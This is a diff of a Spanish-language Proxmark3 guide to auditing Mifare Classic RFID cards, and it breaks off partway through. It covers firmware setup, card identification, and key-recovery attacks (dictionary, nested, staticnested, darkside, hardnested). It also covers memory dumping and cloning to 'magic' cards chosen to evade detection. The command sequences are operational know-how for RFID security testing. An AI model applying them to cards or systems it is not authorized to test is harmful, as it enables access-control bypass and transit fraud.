@@ -78,9 +78,9 @@ El siguiente procedimiento detalla la puesta en marcha de un Proxmark3 Easy (cla
 
 #### 1. Preparación del Entorno (Windows)
 
-El método más recomendado y consistente para Windows es utilizar ProxSpace. Se trata de un entorno de desarrollo sandbox preconfigurado que incluye el toolchain GNU ARM y un entorno Bash, eliminando la complejidad de gestionar dependencias manualmente.
+El método más recomendado y consistente para Windows es utilizar **ProxSpace** (versión 3.x o superior). Se trata de un entorno de desarrollo sandbox preconfigurado que incluye el toolchain GNU ARM y un entorno Bash, eliminando la complejidad de gestionar dependencias manualmente.
 
-Una vez dentro del entorno ProxSpace, clona el repositorio oficial de RRG/Iceman:
+Descarga ProxSpace desde el repositorio oficial y ejecútalo. Una vez dentro del entorno ProxSpace, clona el repositorio oficial de RRG/Iceman:
 
 ```bash
 git clone https://github.com/RfidResearchGroup/proxmark3.git
@@ -89,22 +89,47 @@ cd proxmark3
 
 #### 2. Preparación del Entorno (Linux/WSL)
 
-En sistemas Linux o en el Subsistema de Windows para Linux (WSL), es necesario instalar las dependencias manualmente. A continuación se listan las más críticas para una distribución basada en Debian/Ubuntu:
+En sistemas Linux o en el Subsistema de Windows para Linux (WSL), es necesario instalar las dependencias manualmente. A continuación se proporciona el comando completo de instalación para una distribución basada en Debian/Ubuntu:
 
-| Función | Dependencias Críticas (apt-get install) |
-|---------|------------------------------------------|
-| Compilador Cruzado | gcc-arm-none-eabi, libnewlib-dev |
-| Entorno Base | git, build-essential, pkg-config |
-| Funcionalidad Cliente | libreadline-dev |
+```bash
+sudo apt-get update
+sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config \
+libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev \
+libbz2-dev liblz4-dev libbluetooth-dev libpython3-dev libssl-dev libgd-dev
+```
 
-> **Nota de Seguridad:** Un punto de fallo común en Linux es la interferencia del servicio **ModemManager**, que sondea los puertos serie y puede interrumpir la comunicación con el Proxmark3. Es crucial deshabilitarlo de forma permanente:
+**Desglose de dependencias por función:**
+
+| Función | Paquetes |
+|---------|----------|
+| Compilador Cruzado ARM | `gcc-arm-none-eabi`, `libnewlib-dev` |
+| Herramientas Base | `git`, `ca-certificates`, `build-essential`, `pkg-config` |
+| Cliente Proxmark3 | `libreadline-dev`, `libbz2-dev`, `liblz4-dev`, `libssl-dev` |
+| Soporte Bluetooth (opcional) | `libbluetooth-dev` |
+| Interfaz gráfica (opcional) | `qtbase5-dev` |
+| Scripts Python (opcional) | `libpython3-dev` |
+| Soporte NFC ePaper (opcional) | `libgd-dev` |
+
+> **⚠️ Advertencia Crítica sobre ModemManager:**
+>
+> Un punto de fallo común en Linux es la interferencia del servicio **ModemManager**, que sondea automáticamente los puertos serie USB para detectar módems. Este servicio puede interferir con la comunicación del Proxmark3 e incluso **causar un brick del dispositivo durante el flasheo**. Es **obligatorio** deshabilitarlo antes de proceder:
 > ```bash
+> sudo systemctl stop ModemManager
 > sudo systemctl disable ModemManager
 > ```
 
+Después de instalar las dependencias, clona el repositorio:
+
+```bash
+git clone https://github.com/RfidResearchGroup/proxmark3.git
+cd proxmark3
+```
+
 #### 3. Configuración del Makefile.platform
 
-Este paso es obligatorio para evitar un brick (dejar el dispositivo inutilizable). Se debe especificar el tipo de hardware para que la compilación se ajuste a sus características (p. ej., tamaño de la memoria flash).
+Este paso es **crítico y obligatorio** para evitar un brick del dispositivo. La configuración incorrecta puede resultar en un firmware incompatible que exceda el tamaño de la memoria flash o utilice configuraciones de hardware incorrectas.
+
+**¿Por qué es necesario?** El repositorio está optimizado por defecto para el Proxmark3 RDV4, que tiene 512KB de flash y características adicionales (flash SPI externo, módulo de tarjeta inteligente). Los dispositivos genéricos como el Proxmark3 Easy pueden tener solo 256KB de flash y carecen de estas características.
 
 Copia el archivo de configuración de ejemplo:
 
@@ -112,31 +137,107 @@ Copia el archivo de configuración de ejemplo:
 cp Makefile.platform.sample Makefile.platform
 ```
 
-Abre el archivo `Makefile.platform` con un editor de texto y modifica las siguientes líneas. El objetivo es deshabilitar la plataforma por defecto (PM3RDV4) y habilitar la genérica (PM3GENERIC):
+Edita el archivo `Makefile.platform` con tu editor preferido (nano, vim, etc.):
+
+```bash
+nano Makefile.platform
+```
+
+**Para un Proxmark3 Easy/Generic estándar (512KB):**
 
 ```makefile
 PLATFORM=PM3GENERIC
-# PLATFORM=PM3RDV4
 ```
+
+**Para un Proxmark3 Easy con solo 256KB de flash:**
+
+Si tu dispositivo tiene limitaciones de memoria (256KB), deberás desactivar funcionalidades para reducir el tamaño del firmware. Una configuración funcional típica sería:
+
+```makefile
+PLATFORM=PM3GENERIC
+PLATFORM_SIZE=256
+STANDALONE=
+SKIP_HITAG=1
+SKIP_FELICA=1
+```
+
+> **Nota:** El parámetro `PLATFORM_SIZE=256` provocará un error de compilación si el firmware excede el límite de 256KB, evitando así un brick por firmware demasiado grande.
 
 #### 4. Compilación y Flasheo
 
-Con el entorno y la configuración listos, ejecuta la siguiente secuencia de comandos para compilar y flashear el firmware en el dispositivo:
+Con el entorno preparado y la configuración correcta, procede a compilar e instalar el firmware:
+
+**Paso 1 - Compilación:**
 
 ```bash
 make clean && make -j
+```
+
+El parámetro `-j` habilita la compilación en paralelo, acelerando significativamente el proceso.
+
+**Paso 2 - Flasheo del Firmware:**
+
+El método más sencillo y recomendado es utilizar el script automático que detecta el puerto:
+
+```bash
 pm3-flash-all
+```
+
+Este comando flashea tanto el **bootrom** como el **fullimage** en una sola operación.
+
+**Alternativa (especificando el puerto manualmente):**
+
+Si el script automático no detecta tu dispositivo, especifica el puerto manualmente:
+
+```bash
+# En Linux
+proxmark3 /dev/ttyACM0 --flash --unlock-bootloader --image bootrom.elf --image fullimage.elf
+
+# En Windows (desde ProxSpace)
+proxmark3 com3 --flash --unlock-bootloader --image bootrom.elf --image fullimage.elf
 ```
 
 #### 5. Recuperación de un Brick (El "Truco del Botón")
 
-Si el dispositivo no responde después del flasheo, es posible que haya entrado en un estado de "brick". Para recuperarlo:
+Si el dispositivo no responde después del flasheo o no es detectado por el flasher (especialmente en la primera vez que se flashea un dispositivo nuevo), puedes forzarlo a entrar en modo bootloader:
 
-1. Desconecta el Proxmark3 del USB.
-2. Mantén presionado el botón físico del dispositivo.
-3. Mientras mantienes el botón presionado, conecta el dispositivo al USB.
-4. Espera 2-3 segundos y suelta el botón.
-5. Ejecuta nuevamente `pm3-flash-all`.
+**Procedimiento:**
+
+1. **Desconecta** el Proxmark3 del puerto USB completamente.
+2. **Mantén presionado** el botón físico del dispositivo.
+3. **Mientras mantienes el botón presionado**, conecta el dispositivo al puerto USB.
+4. **Observa los LEDs**: Dos de los cuatro LEDs deberían permanecer encendidos cuando sueltes el botón. Esto indica que estás en modo bootloader.
+5. Suelta el botón (excepto en bootloaders muy antiguos, donde debes mantenerlo presionado durante todo el proceso).
+6. Ejecuta nuevamente el comando de flasheo:
+
+```bash
+pm3-flash-all
+```
+
+> **Nota importante:** Si los LEDs no permanecen encendidos al soltar el botón, tienes un bootloader muy antiguo. En ese caso, repite el proceso pero **mantén el botón presionado durante todo el flasheo**.
+
+#### 6. Verificación de la Instalación
+
+Una vez completado el flasheo exitosamente, ejecuta el cliente para verificar que todo funciona correctamente:
+
+```bash
+pm3
+```
+
+O especificando el puerto:
+
+```bash
+proxmark3 /dev/ttyACM0
+```
+
+Dentro del cliente, ejecuta:
+
+```
+hw status
+hw version
+```
+
+Deberías ver información sobre tu dispositivo, confirmando que el firmware y el cliente están sincronizados y funcionando correctamente.
 
 Con el dispositivo actualizado y correctamente configurado, ya está listo para comenzar la fase de reconocimiento de tarjetas objetivo.
 
@@ -146,21 +247,64 @@ Con el dispositivo actualizado y correctamente configurado, ya está listo para 
 
 Al igual que en una prueba de penetración de redes, la primera fase práctica de una auditoría RFID es el reconocimiento. Antes de intentar cualquier ataque, es fundamental identificar el tipo de tarjeta objetivo para determinar su tecnología, posibles vulnerabilidades y las vías de ataque más efectivas.
 
-Para realizar una identificación inicial de una tarjeta de alta frecuencia (HF), el procedimiento es el siguiente:
+#### Identificación de Tarjetas de Alta Frecuencia (HF)
 
-1. Coloca la tarjeta sobre la antena HF del Proxmark3 y ejecuta el comando de búsqueda universal:
+Para realizar una identificación inicial de una tarjeta de alta frecuencia (HF, 13.56 MHz), ejecuta el comando de búsqueda universal:
 
 ```bash
 hf search
 ```
 
-2. El comando devolverá información clave sobre la tarjeta detectada. A continuación se muestran los campos más importantes:
+Este comando realiza un análisis automático y exhaustivo de la tarjeta presente, intentando identificar su tipo mediante la interacción con diferentes protocolos (ISO14443-A, ISO14443-B, ISO15693, etc.).
 
-- **UID (Unique Identifier)**: El número de serie único de la tarjeta.
-- **ATQA (Answer to Request, Type A)**: Proporciona información sobre el tipo de tarjeta y sus capacidades de comunicación.
-- **SAK (Select Acknowledge)**: Este valor es crucial para el auditor, ya que confirma si se enfrenta a una Mifare Classic 1K (un SAK de 08), una 4K (SAK 18), o una variante diferente, determinando directamente la estructura de memoria y la superficie de ataque.
+**Información crítica que devuelve el comando:**
 
-3. La salida también puede ofrecer pistas cruciales para ataques posteriores, como si la tarjeta responde a "comandos mágicos" (indicativo de una tarjeta clonable) o si su generador de números pseudoaleatorios (PRNG) es débil, una vulnerabilidad conocida en modelos más antiguos.
+- **UID (Unique Identifier)**: El número de serie único de la tarjeta. Puede ser de 4, 7 o 10 bytes. Un UID de 4 bytes suele indicar una tarjeta más simple, mientras que UIDs más largos pueden corresponder a tarjetas con mayor nivel de seguridad o funcionalidades extendidas.
+
+- **ATQA (Answer to Request, Type A)**: Un valor de 2 bytes que proporciona información preliminar sobre el tipo de tarjeta y sus capacidades de comunicación. Por ejemplo, `0x0004` es común en Mifare Classic 1K.
+
+- **SAK (Select Acknowledge)**: Este valor de 1 byte es **crucial para el auditor**, ya que determina de manera definitiva el tipo y tamaño de la tarjeta:
+  - `0x08`: Mifare Classic 1K (16 sectores de 4 bloques cada uno, 1024 bytes totales)
+  - `0x09`: Mifare Classic Mini (5 sectores, 320 bytes)
+  - `0x18`: Mifare Classic 4K (40 sectores: 32 de 4 bloques + 8 de 16 bloques, 4096 bytes)
+  - `0x28`: Mifare Classic 1K emulada
+  - `0x88`: Mifare Classic 1K infinita (algunas tarjetas especiales)
+
+- **ATS (Answer To Select)**: Si está presente, indica que la tarjeta soporta ISO14443-4, lo que puede significar que no es una Mifare Classic estándar.
+
+**Ejemplo de salida típica:**
+
+```
+[+] UID: 35 3C 2A A6
+[+] ATQA: 00 04
+[+] SAK: 08 [2]
+[=] TYPE: MIFARE Classic 1K
+[=] Possible Types:
+[+]  MIFARE Classic 1K
+```
+
+**Análisis adicional con comando específico:**
+
+Para obtener información más detallada sobre una tarjeta Mifare específica, utiliza:
+
+```bash
+hf mf info
+```
+
+Este comando además de identificar el tipo de tarjeta, realiza pruebas para detectar:
+- **Tarjetas mágicas** (Gen1a, Gen2, DirectWrite, etc.): Responden a comandos especiales de backdoor que permiten reescribir el bloque 0 (UID).
+- **PRNG débil**: Algunas tarjetas Mifare antiguas utilizan generadores de números pseudoaleatorios predecibles, haciéndolas vulnerables al ataque Darkside.
+- **Nonces estáticos**: Detecta si la tarjeta implementa nonces estáticos cifrados (contramedida contra el ataque nested).
+
+#### Identificación de Tarjetas de Baja Frecuencia (LF)
+
+Para tarjetas de baja frecuencia (125-134 kHz), como llaveros de acceso comunes, el comando es:
+
+```bash
+lf search
+```
+
+Este comando intenta identificar protocolos LF comunes como EM410x, HID Prox, Indala, T55x7, entre otros.
 
 Una vez identificado el tipo de tarjeta como Mifare Classic, el siguiente paso lógico es intentar obtener las claves criptográficas que protegen el acceso a sus sectores de memoria.
 
@@ -168,59 +312,280 @@ Una vez identificado el tipo de tarjeta como Mifare Classic, el siguiente paso l
 
 La estrategia para obtener las claves de una tarjeta Mifare Classic sigue un enfoque metodológico, comenzando con los métodos más simples y rápidos y escalando hacia técnicas más complejas solo si los primeros fallan. Este proceso demuestra una progresión lógica desde la explotación de configuraciones débiles hasta vulnerabilidades más profundas del protocolo.
 
-#### 1. Ataque de Diccionario (Claves por Defecto)
+#### 1. Herramienta Automatizada: autopwn (Recomendado)
 
-Una cantidad sorprendentemente alta de sistemas que utilizan tarjetas Mifare Classic no cambian las claves de transporte predeterminadas de fábrica. La clave más común es `FFFFFFFFFFFF`.
+El comando `hf mf autopwn` es la herramienta de automatización integral por excelencia para la auditoría de Mifare Classic. Ejecuta una secuencia inteligente y adaptativa de múltiples técnicas de ataque en el siguiente orden:
 
-El comando `hf mf autopwn` es la herramienta automatizada por excelencia para esta tarea. Entre otras estrategias, intenta autenticarse en cada sector utilizando una lista predefinida de claves por defecto de uso común.
+1. **Ataque de diccionario** con claves por defecto
+2. **Ataque Darkside** (si la tarjeta es vulnerable)
+3. **Ataque Nested** (si se encuentra al menos una clave)
+4. **Ataque StaticNested** (para tarjetas con contramedidas)
+
+**Sintaxis básica:**
 
 ```bash
 hf mf autopwn
 ```
 
-Si tiene éxito, `autopwn` no solo revela las claves, sino que también realiza un volcado completo de la memoria de la tarjeta y guarda las claves encontradas en archivos para su uso posterior.
-
-#### 2. Ataque Nested (Claves No Estándar)
-
-Este ataque explota una vulnerabilidad en el protocolo de autenticación del cifrador CRYPTO1. Si se conoce la clave de un sector (ya sea A o B), es posible utilizarla para realizar un ataque de autenticación anidada que revela la clave del sector adyacente. Esta técnica es posible debido a una debilidad fundamental en el protocolo de autenticación de CRYPTO1, donde parte del estado interno del cifrador se filtra indirectamente durante los intercambios, permitiendo que una clave conocida para un sector sea utilizada para descifrar la clave de un sector adyacente.
-
-El comando `autopwn` intenta ejecutar este ataque de forma automática tan pronto como encuentra al menos una clave válida, propagando el compromiso a través de la tarjeta.
-
-Si se requiere un intento manual, se puede utilizar el comando específico:
+**Opciones avanzadas:**
 
 ```bash
-hf mf nested
+hf mf autopwn --1k                           # Especifica Mifare Classic 1K
+hf mf autopwn -k FFFFFFFFFFFF                # Proporciona una clave conocida como punto de partida
+hf mf autopwn -s 0 -a -k FFFFFFFFFFFF       # Especifica sector 0, clave A conocida
+hf mf autopwn -f mfc_default_keys.dic       # Utiliza un diccionario personalizado
+hf mf autopwn --slow                         # Modo lento para tarjetas no estándar
+hf mf autopwn -v                             # Salida verbose con estadísticas
 ```
 
-#### 3. Ataque StaticNested
+**Parámetros importantes:**
 
-Como contramedida al ataque nested, algunas tarjetas implementan un "nonce estático cifrado". Este mecanismo intenta frustrar la vulnerabilidad del protocolo.
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--1k` / `--2k` / `--4k` / `--mini` | Especifica el tamaño de la tarjeta |
+| `-k, --key <hex>` | Clave conocida (12 caracteres hexadecimales) |
+| `-s, --sector <dec>` | Número de sector de la clave conocida |
+| `-a` / `-b` | Especifica si la clave conocida es tipo A o B |
+| `-f, --file <fn>` | Archivo de diccionario de claves |
+| `--slow` | Adquisición más lenta (requerido para algunas tarjetas no estándar) |
+| `-l, --legacy` | Usa el modo legacy (comando `hf mf chk` lento) |
+| `-v, --verbose` | Salida detallada con estadísticas |
 
-El ataque `staticnested` fue desarrollado específicamente para superar esta protección. Es una variante del ataque nested que funciona contra estas tarjetas con contramedidas, demostrando la continua carrera armamentista en la seguridad de RF.
+**Salida del comando:**
+
+Si tiene éxito, `autopwn` genera automáticamente:
+- **Archivo de claves**: `hf-mf-<UID>-key.bin` - Contiene todas las claves recuperadas
+- **Archivo de volcado**: `hf-mf-<UID>-dump.bin` - Volcado completo de la memoria de la tarjeta
+- **Archivo EML**: `hf-mf-<UID>-dump.eml` - Formato de texto para emulación
+- **Archivo JSON**: `hf-mf-<UID>-dump.json` - Formato estructurado para análisis
+
+#### 2. Ataques Manuales Específicos
+
+Para situaciones donde se requiere un control más granular o cuando autopwn no tiene éxito, los siguientes ataques pueden ejecutarse manualmente:
+
+##### 2.1. Ataque de Diccionario (Claves por Defecto)
+
+Una cantidad sorprendentemente alta de sistemas que utilizan tarjetas Mifare Classic (estudios indican más del 30%) no cambian las claves de transporte predeterminadas de fábrica. Las claves más comunes son:
+
+- `FFFFFFFFFFFF` (clave de fábrica por defecto)
+- `A0A1A2A3A4A5` (clave MAD - Mifare Application Directory)
+- `D3F7D3F7D3F7` (clave NDEF)
+- `000000000000` (clave en blanco)
+- `B0B1B2B3B4B5`, `AABBCCDDEEFF`, entre otras
+
+**Comando de verificación rápida:**
 
 ```bash
-hf mf staticnested
+hf mf chk --1k                               # Usa diccionario por defecto
+hf mf chk --1k -f mfc_default_keys.dic      # Usa diccionario personalizado
+hf mf chk --1k --dump                        # Guarda las claves encontradas
+hf mf chk --1k --emu                         # Carga las claves en el emulador
 ```
+
+**Verificación rápida (más veloz):**
+
+El comando `hf mf fchk` (fast check) es una versión optimizada del ataque de diccionario:
+
+```bash
+hf mf fchk --1k                              # Verificación rápida con diccionario por defecto
+hf mf fchk --1k --mem                        # Usa diccionario desde flashmemory (RDV4)
+hf mf fchk --1k -f mfc_default_keys.dic     # Usa diccionario personalizado
+```
+
+##### 2.2. Ataque Nested
+
+Este ataque explota una vulnerabilidad criptográfica fundamental en el protocolo de autenticación de CRYPTO1. Cuando el Proxmark3 se autentica con una clave conocida (ya sea A o B de cualquier sector), puede capturar información que se filtra del estado interno del cifrador durante las comunicaciones subsiguientes. Esta filtración permite calcular matemáticamente las claves de otros sectores.
+
+**¿Cómo funciona?** Durante la autenticación, CRYPTO1 genera un "nonce" (número usado una sola vez). La debilidad radica en que el nonce y la respuesta cifrada revelan suficiente información sobre el keystream, permitiendo que un atacante con una clave conocida pueda derivar otras claves mediante análisis criptográfico.
+
+**Sintaxis:**
+
+```bash
+hf mf nested --1k                                           # Automático para todas las claves
+hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF              # Especifica bloque y clave conocida
+hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF --dump       # Guarda dump automáticamente
+```
+
+**Parámetros:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--blk <dec>` | Número de bloque con clave conocida |
+| `-a` / `-b` | Tipo de clave conocida (A o B) |
+| `-k, --key <hex>` | Clave conocida (12 hex bytes) |
+| `--tblk <dec>` | Bloque objetivo (opcional) |
+| `--ta` / `--tb` | Tipo de clave objetivo |
+| `--dump` | Genera dump automático tras recuperar todas las claves |
+
+**Tiempo de ejecución:** Generalmente entre 5-30 segundos para recuperar todas las claves de una tarjeta 1K, dependiendo de la calidad de la señal.
+
+##### 2.3. Ataque StaticNested
+
+Como contramedida directa al ataque nested, algunos fabricantes implementaron tarjetas con **nonces estáticos cifrados**. Estas tarjetas generan siempre el mismo nonce para una clave dada, pero cifrado, intentando frustrar el ataque nested tradicional.
+
+El ataque `staticnested` fue desarrollado específicamente para superar esta protección, demostrando la continua carrera armamentista en la seguridad de RF. Funciona recolectando múltiples respuestas cifradas y analizando los patrones para derivar las claves.
+
+**Sintaxis:**
+
+```bash
+hf mf staticnested --1k --blk 0 -a -k FFFFFFFFFFFF
+```
+
+Los parámetros son idénticos al ataque nested estándar.
+
+**Nota importante:** Este ataque requiere más tiempo (puede tardar varios minutos) y no todas las implementaciones de nonces estáticos son vulnerables. El comando intentará detectar automáticamente si la tarjeta es susceptible.
+
+##### 2.4. Ataque Darkside (Tarjetas con PRNG Débil)
+
+Algunas tarjetas Mifare Classic antiguas o de fabricantes alternativos utilizan generadores de números pseudoaleatorios (PRNG) débiles o predecibles. El ataque Darkside explota esta debilidad.
+
+**Sintaxis:**
+
+```bash
+hf mf darkside
+```
+
+Este ataque es completamente autónomo y no requiere conocer ninguna clave previamente. Si la tarjeta es vulnerable, puede recuperar una clave válida en cuestión de segundos.
+
+##### 2.5. Ataque Hardnested (Último Recurso)
+
+Para tarjetas "endurecidas" que implementan contramedidas más sofisticadas, el ataque hardnested utiliza técnicas criptoanalíticas avanzadas y análisis estadístico profundo.
+
+**Sintaxis:**
+
+```bash
+hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
+```
+
+**Advertencia:** Este ataque puede tardar desde varios minutos hasta horas, requiere recolección de un gran número de nonces (~50,000+) y procesamiento offline intensivo. Se recomienda solo cuando todos los otros métodos han fallado.
 
 ### 2.3. Lectura del Contenido de la Tarjeta
 
 Obtener las claves de acceso es el objetivo principal de la fase de ataque, ya que concede control total sobre la información almacenada en la tarjeta. Con las claves, un auditor puede leer, modificar o clonar los datos, que en última instancia representan el activo que el sistema de seguridad pretende proteger (por ejemplo, un crédito de transporte, un permiso de acceso o datos de identificación).
 
-Una vez que se han obtenido las claves, la memoria de la tarjeta puede ser leída de la siguiente manera:
+#### Lectura de Bloques Individuales
 
-Para leer un bloque de memoria específico, se utiliza el comando `hf mf rdbl` (read block), que requiere especificar el número de bloque, la clave del sector correspondiente y el tipo de clave (A o B).
+Para leer un bloque de memoria específico, se utiliza el comando `hf mf rdbl` (read block):
 
-Ejemplo de sintaxis:
+**Sintaxis:**
 
 ```bash
-hf mf rdbl <bloque> <A|B> <clave>
+hf mf rdbl --blk <número> -a -k <clave>     # Usando clave A
+hf mf rdbl --blk <número> -b -k <clave>     # Usando clave B
 ```
 
-Sin embargo, en la práctica, la lectura bloque por bloque rara vez es necesaria. Tras un ataque exitoso con `hf mf autopwn`, se genera automáticamente un archivo de volcado completo de la memoria (por ejemplo, `hf-mf-B4EE8234-data.bin`). Este archivo `.bin` contiene una copia exacta de todos los datos de la tarjeta.
+**Ejemplos prácticos:**
 
-**Aplicación en el Mundo Real**: La eficacia de estas técnicas de ataque no es meramente teórica. Han sido demostradas públicamente contra sistemas de transporte a gran escala, como la Oyster Card de Londres y la OV-Chipkaart de los Países Bajos, lo que obligó a los operadores a actualizar su infraestructura de seguridad.
+```bash
+hf mf rdbl --blk 0 -a -k FFFFFFFFFFFF       # Lee el bloque 0 (fabricante) con clave A por defecto
+hf mf rdbl --blk 4 -a -k FFFFFFFFFFFF       # Lee el bloque 4 (primer bloque del sector 1)
+hf mf rdbl --blk 7 -a -k A0A1A2A3A4A5       # Lee el sector trailer del sector 1
+```
 
-La capacidad de leer y volcar el contenido completo de una tarjeta es el prerrequisito para el siguiente y más impactante paso de la auditoría: la clonación.
+**Parámetros:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--blk <dec>` | Número de bloque a leer (0-255 dependiendo del tamaño de la tarjeta) |
+| `-a` | Usar clave tipo A (por defecto) |
+| `-b` | Usar clave tipo B |
+| `-k, --key <hex>` | Clave de autenticación (12 caracteres hexadecimales) |
+
+#### Lectura de Sectores Completos
+
+Para leer todos los bloques de un sector específico, utiliza el comando `hf mf rdsc` (read sector):
+
+```bash
+hf mf rdsc -s 0 -a -k FFFFFFFFFFFF          # Lee todo el sector 0
+hf mf rdsc -s 1 -a -k FFFFFFFFFFFF          # Lee todo el sector 1
+```
+
+Este comando es más eficiente cuando necesitas analizar todos los datos de un sector específico.
+
+#### Volcado Completo de la Tarjeta
+
+En la práctica, la lectura bloque por bloque rara vez es necesaria. Para un análisis completo, se recomienda realizar un **volcado total de la memoria**.
+
+**Volcado automático tras recuperar claves:**
+
+Tras un ataque exitoso con `hf mf autopwn`, se generan automáticamente varios archivos:
+
+- `hf-mf-<UID>-dump.bin` - Volcado binario completo
+- `hf-mf-<UID>-dump.eml` - Formato emulador (texto)
+- `hf-mf-<UID>-dump.json` - Formato JSON estructurado
+- `hf-mf-<UID>-key.bin` - Todas las claves recuperadas
+
+**Volcado manual con archivo de claves:**
+
+Si ya tienes un archivo de claves previamente guardado:
+
+```bash
+hf mf dump --1k                                        # Busca archivo de claves automáticamente basado en UID
+hf mf dump --1k -k hf-mf-<UID>-key.bin                # Especifica archivo de claves
+hf mf dump --1k -k hf-mf-<UID>-key.bin -f mydump      # Especifica nombre de salida personalizado
+```
+
+**Parámetros del comando dump:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--1k` / `--2k` / `--4k` / `--mini` | Tamaño de la tarjeta |
+| `-k, --keys <fn>` | Archivo con las claves |
+| `-f, --file <fn>` | Nombre personalizado para el archivo de salida |
+
+#### Visualización del Contenido del Dump
+
+Para analizar el contenido de un volcado sin necesidad de editores hexadecimales:
+
+```bash
+hf mf view -f hf-mf-<UID>-dump.bin                    # Vista completa del dump
+hf mf view -f hf-mf-<UID>-dump.eml                    # Vista desde archivo EML
+```
+
+Este comando muestra:
+- **Datos de cada bloque** en formato hexadecimal y ASCII
+- **Sector trailers** con las claves y bytes de acceso
+- **Decodificación de los bits de acceso** para cada sector
+- **Bloques de valor** (si existen) con su interpretación decimal
+
+#### Análisis de Bits de Acceso (Access Bits)
+
+Para comprender los permisos de lectura/escritura de un sector específico:
+
+```bash
+hf mf acl -d <hex>                                     # Decodifica los access bits
+```
+
+**Ejemplo:**
+
+```bash
+hf mf acl -d 787788                                    # Decodifica los access bits típicos de fábrica
+```
+
+Esto mostrará una tabla interpretando qué operaciones (lectura, escritura, incremento, decremento) son permitidas con cada clave (A o B) para cada bloque del sector.
+
+#### Estructura de Memoria Mifare Classic 1K
+
+Para interpretar correctamente los datos, es importante comprender la estructura:
+
+| Sectores | Bloques por Sector | Bloques Totales | Bytes por Bloque | Total |
+|----------|-------------------|-----------------|------------------|-------|
+| 16 | 4 | 64 | 16 | 1024 bytes |
+
+- **Bloque 0 (Sector 0)**: Contiene el UID (4 bytes), BCC, manufacturer data. **Solo lectura en tarjetas estándar**.
+- **Bloques 1-2 (Sector 0)**: Datos de usuario.
+- **Bloque 3 (Sector trailer)**: Contiene Key A (6 bytes), Access Bits (3 bytes), GPB (1 byte), Key B (6 bytes).
+- **Sectores 1-15**: Igual estructura (bloques de datos + sector trailer).
+
+**Aplicación en el Mundo Real**: La eficacia de estas técnicas de ataque no es meramente teórica. Han sido demostradas públicamente contra sistemas de transporte a gran escala:
+
+- **Oyster Card (Londres)**: El sistema fue comprometido en 2008, demostrando que las claves de transporte no estaban adecuadamente protegidas.
+- **OV-Chipkaart (Países Bajos)**: Vulnerabilidades similares forzaron actualizaciones masivas del sistema.
+- **Sistemas de metro de Boston, Madrid y otros**: También fueron objeto de demostraciones académicas de estas vulnerabilidades.
+
+Estos casos obligaron a los operadores a actualizar su infraestructura de seguridad, implementar nuevas tecnologías (como Mifare DESFire, MIFARE Plus o sistemas basados en tokens únicos) y reforzar la protección de las claves criptográficas.
+
+La capacidad de leer y volcar el contenido completo de una tarjeta es el prerrequisito para el siguiente y más impactante paso de la auditoría: la clonación y manipulación de datos.
 
 ## 3. Clonación y Manipulación
 
@@ -232,40 +597,329 @@ El proceso de clonación de una tarjeta Mifare Classic se realiza en dos etapas 
 
 #### 1. Creación del Archivo de Backup
 
-Como se mencionó anteriormente, comandos como `hf mf autopwn` generan automáticamente un archivo de volcado de la memoria (dump) al finalizar con éxito. Este archivo, cuyo nombre suele incluir el UID de la tarjeta original (p. ej., `hf-mf-B4EE8234-data.bin`), sirve como la "fuente" o el "backup" completo de la tarjeta original.
+Como se mencionó anteriormente, comandos como `hf mf autopwn` generan automáticamente un archivo de volcado de la memoria (dump) al finalizar con éxito. Este archivo, cuyo nombre incluye el UID de la tarjeta original (p. ej., `hf-mf-A29558E4-dump.bin`), sirve como la "fuente" o el "backup" completo de la tarjeta original.
+
+**Archivos generados automáticamente:**
+- `hf-mf-<UID>-dump.bin` - Volcado binario completo
+- `hf-mf-<UID>-dump.eml` - Formato emulador (texto)
+- `hf-mf-<UID>-dump.json` - Formato JSON estructurado
+- `hf-mf-<UID>-key.bin` - Todas las claves recuperadas
 
 #### 2. Clonación a una Tarjeta Mágica
 
-La clonación de una tarjeta Mifare Classic requiere una tarjeta virgen especial, comúnmente conocida como "tarjeta mágica" (por ejemplo, Gen1a o Gen2). A diferencia de las tarjetas estándar, estas tarjetas permiten la reescritura del bloque 0, que contiene el UID y los datos del fabricante, un área que normalmente es de solo lectura. Las tarjetas Gen1a utilizan un comando "mágico" de backdoor para habilitar la escritura en el bloque 0, mientras que las tarjetas Gen2 permiten la escritura directa en el bloque 0 con un comando de escritura estándar, lo que las hace más difíciles de detectar por sistemas que buscan específicamente los comandos de backdoor de las Gen1a.
+La clonación de una tarjeta Mifare Classic requiere una tarjeta virgen especial, comúnmente conocida como "tarjeta mágica". Existen diferentes tipos de tarjetas mágicas, cada una con características y métodos de escritura específicos:
 
-El proceso de clonación se realiza con los siguientes comandos:
+**Tipos de Tarjetas Mágicas:**
 
-**Paso 1**: Restaurar el contenido completo del archivo de volcado en la tarjeta mágica. Esto escribe todos los datos de los sectores, incluyendo los sector trailers con las claves originales.
+| Tipo | Nombre Alternativo | Características | Detección |
+|------|-------------------|-----------------|----------|
+| **Gen1A** | UID, ZERO (RU) | Comandos backdoor `40(7)`, `43` | Fácilmente detectable |
+| **Gen2** | CUID, DirectWrite | Escritura directa a bloque 0 | Difícil de detectar |
+| **Gen3** | APDU | Comandos APDU especiales | Muy difícil de detectar |
+| **Gen4** | Ultimate Magic Card (UMC) | Completamente configurable | Indetectable si configurada correctamente |
+
+**Proceso de Clonación Completo:**
+
+##### Método 1: Secuencia Automatizada (Recomendado para Gen2/CUID)
 
 ```bash
-hf mf restore --file hf-mf-B4EE8234-data.bin
+# Para tarjetas Gen2/CUID (más modernas y difíciles de detectar)
+hf mf restore --1k --uid A29558E4 -k hf-mf-A29558E4-key.bin -f hf-mf-A29558E4-dump.bin
 ```
 
-**Paso 2**: Clonar el Identificador Único (UID) de la tarjeta original a la tarjeta mágica. Este paso es el que hace que la tarjeta clonada sea indistinguible del original para la mayoría de los lectores.
+**Parámetros del comando restore:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--1k` / `--2k` / `--4k` / `--mini` | Tamaño de la tarjeta objetivo |
+| `--uid <hex>` | UID de la tarjeta original (opcional, se lee del dump) |
